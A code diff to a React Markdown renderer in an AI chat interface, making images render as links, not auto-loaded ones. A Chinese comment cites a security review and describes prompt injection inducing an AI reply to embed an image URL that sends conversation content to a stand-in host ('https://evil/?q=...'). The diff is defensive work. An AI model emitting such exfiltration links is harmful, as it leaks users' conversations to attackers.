@@ -40,6 +40,13 @@ const components: Components = {
     pre: ({ children }) => <pre className="my-2 overflow-x-auto rounded-md bg-current/10 p-2.5 text-xs">{children}</pre>,
     blockquote: ({ children }) => <blockquote className="my-2 border-l-2 border-current/30 pl-3 opacity-80">{children}</blockquote>,
     hr: () => <hr className="my-3 border-current/20" />,
+    // 图片一律不自动加载、只给链接（2026-09-30 安全审查 M7）：AI 回复的 ![](url) 可能是被提示注入诱导出来的
+    // 外带地址（https://evil/?q=<对话内容>），一渲染就会自动发请求。widget 的 Markdown 本就不渲染图片，两端口径一致。
+    img: ({ src, alt }) => (typeof src === 'string' && /^https?:\/\//i.test(src) ? (
+        <a href={src} target="_blank" rel="noopener noreferrer" className="underline underline-offset-2 break-all">
+            查看图片{alt ? `：${alt}` : ''}
+        </a>
+    ) : null),
     table: ({ children }) => (
         <div className="my-2 overflow-x-auto">
             <table className="text-xs border-collapse">{children}</table>
